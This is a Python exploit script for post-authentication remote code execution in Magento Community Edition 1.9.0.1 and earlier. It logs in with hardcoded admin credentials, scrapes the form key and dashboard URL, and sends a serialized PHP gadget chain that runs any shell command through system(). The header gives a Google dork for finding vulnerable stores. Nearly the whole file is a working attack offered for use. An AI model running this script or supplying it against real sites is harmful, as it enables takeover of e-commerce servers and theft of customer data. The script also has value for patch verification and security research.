#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE 
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import mechanize
import pdb


def usage():
    print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"")
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'testing'
password = 'testing'
php_function = 'system'  # Note: we can only pass 1 argument to the function
#install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
# Setup the mechanize browser and options
br = mechanize.Browser()
br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
userone = br.find_control(name='login[username]',nr=0)
userone.value = username
br.form.fixup()
#br['login[username]'] = username
br['login[password]'] = password
br.form.fixup()

br.method = "POST"
request = br.submit()
#print(request.read())
content = request.read()

content = str(content)
content = content.replace("+", '\n')

foundurl = re.search("ajaxBlockUrl = (.*)", content)

#url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = foundurl.group(1).replace("\\'","").replace(" ","")
print(url)
#exit(0)
#t.group(1).replace("\\'","")
#t.group(1).replace("\\'","").replace(" ","")
#pdb.set_trace()
#breakpoint()
#print(url.group(0))
#url = url.group(1)

#key = re.search("var FORM_KEY = '(.*)'", content)

key = content.replace(";",'\n')
key = re.search("var FORM_KEY = (.*)", key)
key = key.group(1).replace("\\'",'')
print(key)
#exit(0)

request = br.open(url + 'block/tab_orders/period/1m/?isAjax=true', data='isAjax=false&form_key=' + key)
text = str(request.read())
print(text)
tunnel = re.search("src=\"(.*)\?ga=", text)
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print(e.read())
